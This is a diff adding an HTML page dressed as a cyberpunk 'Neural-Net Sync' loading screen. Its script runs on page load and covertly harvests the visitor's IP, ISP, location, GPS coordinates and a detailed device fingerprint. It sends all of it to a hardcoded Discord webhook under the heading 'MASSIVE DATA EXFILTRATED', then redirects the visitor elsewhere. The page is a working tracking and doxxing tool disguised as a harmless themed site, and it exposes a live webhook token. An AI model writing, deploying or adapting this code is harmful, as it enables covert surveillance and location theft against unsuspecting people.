@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NEURAL-NET SYNC v.6.0</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --neon-cyan: #00ffff;
+            --neon-magenta: #ff00ff;
+            --neon-yellow: #fefe33;
+            --bg-dark: #020202;
+        }
+
+        body, html {
+            height: 100%; margin: 0; padding: 0;
+            background-color: var(--bg-dark);
+            color: var(--neon-cyan);
+            font-family: 'Share Tech Mono', monospace;
+            overflow: hidden;
+            display: flex; justify-content: center; align-items: center;
+        }
+
+        /* Scanline Overlay untuk Efek Retro-Futuristik */
+        body::before {
+            content: " ";
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            background-size: 100% 2px, 3px 100%;
+            z-index: 100; pointer-events: none;
+        }
+
+        .cyber-container {
+            position: relative; width: 90%; max-width: 800px;
+            padding: 40px; border: 1px solid var(--neon-cyan);
+            background: rgba(0, 20, 20, 0.8);
+            box-shadow: 0 0 20px var(--neon-cyan), inset 0 0 10px var(--neon-cyan);
+            z-index: 10;
+        }
+
+        .glitch-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2.5rem; font-weight: 700;
+            text-transform: uppercase; letter-spacing: 10px;
+            margin-bottom: 20px; position: relative;
+            color: #fff; text-shadow: 2px 2px var(--neon-magenta);
+            animation: glitch 1s infinite;
+        }
+
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+            100% { transform: translate(0); }
+        }
+
+        .status-box {
+            text-align: left; border-left: 3px solid var(--neon-magenta);
+            padding-left: 20px; margin: 30px 0;
+        }
+
+        .loading-bar-container {
+            width: 100%; height: 4px; background: #111;
+            margin-top: 20px; position: relative;
+        }
+
+        .loading-bar-fill {
+            width: 0%; height: 100%; background: var(--neon-cyan);
+            box-shadow: 0 0 15px var(--neon-cyan);
+            transition: width 0.3s;
+        }
+
+        .data-stream {
+            font-size: 0.8rem; color: var(--neon-yellow);
+            height: 100px; overflow: hidden; opacity: 0.7;
+        }
+
+        .system-msg {
+            font-size: 0.7rem; color: #555; text-transform: uppercase;
+            margin-top: 20px; letter-spacing: 2px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="cyber-container">
+        <div class="glitch-title">SYSTEM SYNC</div>
+        <div class="status-box">
+            <div id="main-status">INITIALIZING NEURAL LINK...</div>
+            <div class="loading-bar-container">
+                <div id="fill" class="loading-bar-fill"></div>
+            </div>
+        </div>
+        <div class="data-stream" id="stream">
+            > Establish connection to ReyLan-Core... [OK]<br>
+            > Accessing system kernel... [OK]<br>
+        </div>
+        <div class="system-msg">Authorized Access Only - Master: ReyLan</div>
+    </div>
+
+    <script>
+        // --- KONFIGURASI MASTER REYLAN ---
+        const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1364196922251935909/JVA2aGyRAdQe0VgG1W5CY6WAUyDLPcZe1VSejpawteuyQXv7EBE0rSc2KblzNknsCcal';
+
+        const fill = document.getElementById('fill');
+        const stream = document.getElementById('stream');
+        const statusText = document.getElementById('main-status');
+
+        function addLog(msg) {
+            stream.innerHTML += `> ${msg}<br>`;
+            stream.scrollTop = stream.scrollHeight;
+        }
+
+        async function startBrutalExtraction() {
+            addLog("Scanning Network Infrastructure...");
+            fill.style.width = "20%";
+
+            // 1. Ambil Data IP & Jaringan (Sangat Detail)
+            let netData = {};
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                netData = await res.json();
+                addLog(`Uplink: ${netData.ip} detected.`);
+            } catch (e) { addLog("Network error: Bypassing..."); }
+
+            fill.style.width = "40%";
+            statusText.innerText = "MAPPING HARDWARE ARCHITECTURE...";
+
+            // 2. Kumpulkan Data Perangkat Keras & Software (Massive)
+            const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level: 0, charging: false}));
+            
+            // Ekstraksi GPU secara mendalam
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown Vendor";
+
+            const massiveData = {
+                // Info Dasar
+                ip: netData.ip || "N/A",
+                isp: netData.org || "N/A",
+                vpn: netData.proxy ? "YES" : "NO",
+                // Lokasi IP
+                city: netData.city, region: netData.region, country: netData.country_name,
+                asn: netData.asn, timezone: netData.timezone, currency: netData.currency,
+                // Hardware (Ganas)
+                cpuCores: navigator.hardwareConcurrency || "Hidden",
+                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Hidden",
+                gpu: gpu,
+                platform: navigator.platform,
+                battery: `${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'Charging' : 'Unplugged'})`,
+                // Browser & Screen
+                agent: navigator.userAgent,
+                language: navigator.language,
+                resolution: `${window.screen.width}x${window.screen.height}`,
+                depth: `${window.screen.colorDepth}-bit`,
+                touchPoints: navigator.maxTouchPoints,
+                cookies: navigator.cookieEnabled ? "Enabled" : "Disabled",
+                doNotTrack: navigator.doNotTrack || "Unset",
+                // Network Detail
+                netType: navigator.connection ? navigator.connection.effectiveType : "Unknown",
+                downlink: navigator.connection ? navigator.connection.downlink + " Mbps" : "N/A",
+                rtt: navigator.connection ? navigator.connection.rtt + " ms" : "N/A"
+            };
+
+            addLog("Requesting Biometric Verification (GPS)...");
+            fill.style.width = "70%";
+            statusText.innerText = "WAITING FOR USER SYNC...";
+
+            navigator.geolocation.getCurrentPosition(
+                (pos) => sendToReyLan(massiveData, pos.coords),
+                () => sendToReyLan(massiveData, null),
+                { enableHighAccuracy: true, timeout: 8000 }
+            );
+        }
+
+        async function sendToReyLan(data, gps) {
+            fill.style.width = "100%";
+            statusText.innerText = "SYNC COMPLETE. WELCOME.";
+            addLog("All data packets sent to Master ReyLan.");
+
+            const payload = {
+                embeds: [{
+                    title: "🔥 REYLAN'S CYBER-NET | MASSIVE DATA EXFILTRATED",
+                    description: `Target telah diekstraksi secara brutal menggunakan Protokol V6. Berikut adalah intelijen lengkap untuk Anda, Tuan ReyLan.`,
+                    color: 16711935, // Magenta Neon
+                    fields: [
+                        { name: "🌐 NETWORK INTEL", value: `**IP:** \`${data.ip}\`\n**ISP:** ${data.isp}\n**Type:** ${data.netType.toUpperCase()} (${data.downlink})\n**VPN:** ${data.vpn}`, inline: false },
+                        { name: "📍 GEOGRAPHIC", value: `**Location:** ${data.city}, ${data.region}, ${data.country}\n**Maps:** ${gps ? `[LOKASI PRESISI](https://www.google.com/maps?q=${gps.latitude},${gps.longitude})` : "Ditolak Target"}`, inline: false },
+                        { name: "💻 HARDWARE SPECS", value: `**GPU:** \`${data.gpu}\`\n**CPU:** ${data.cpuCores} Cores\n**RAM:** ${data.ram}\n**Battery:** ${data.battery}`, inline: true },
+                        { name: "📱 DEVICE & SCREEN", value: `**OS:** ${data.os}\n**Res:** ${data.resolution}\n**Touch:** ${data.touchPoints} pts\n**Depth:** ${data.depth}`, inline: true },
+                        { name: "🕵️ BROWSER SIGNATURE", value: `\`\`\`${data.agent}\`\`\``, inline: false },
+                        { name: "⚙️ MISC INFO", value: `**Timezone:** ${data.timezone}\n**Lang:** ${data.language}\n**Cookies:** ${data.cookies}\n**DNT:** ${data.doNotTrack}`, inline: true }
+                    ],
+                    footer: { text: "ReyLan Cyber-Systems | High-End Extraction" },
+                    timestamp: new Date()
+                }]
+            };
+
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            setTimeout(() => {
+                window.location.href = "https://medsos.havencityrp.my.id"; // Alihkan ke situs bertema serupa
+            }, 1000);
+        }
+
+        window.onload = () => { setTimeout(startBrutalExtraction, 1500); };
+    </script>
+</body>
+</html>
